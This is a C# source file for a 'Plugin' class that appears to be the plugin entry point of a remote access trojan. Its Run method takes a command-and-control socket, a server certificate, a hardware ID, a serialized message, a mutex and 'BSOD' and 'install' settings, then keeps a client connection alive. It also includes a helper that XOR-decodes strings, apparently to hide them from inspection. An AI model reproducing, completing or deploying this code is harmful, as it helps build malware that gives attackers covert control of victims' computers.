using System.Diagnostics;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;

namespace Plugin
{
    public class Plugin
    {
        public static Socket Socket;
        public static Mutex AppMutex;
        public static string Mutex;
        public static string BSOD;
        public static string Install;
        public static string InstallFile;

        public void Run(Socket socket, X509Certificate2 certificate, string hwid, byte[] msgPack, Mutex mutex, string mtx, string bsod, string install)
        {


            Debug.WriteLine("Plugin Invoked");
            AppMutex = mutex;
            Mutex = mtx;
            BSOD = bsod;
            Install = install;
            Socket = socket;
            Connection.ServerCertificate = certificate;
            Connection.Hwid = hwid;
            new Thread(() =>
            {
                Connection.InitializeClient(msgPack);
            }).Start();

            while (Connection.IsConnected)
            {
                Thread.Sleep(1000);
            }

        }

        private static string reupload(string str)
        {
            var ch1 = '\n';
            var stringBuilder = new StringBuilder();

            foreach (uint num in str.ToCharArray())
            {
                var ch2 = (char)(num ^ ch1);
                stringBuilder.Append(ch2);
            }

            return stringBuilder.ToString();
        }
    }
}
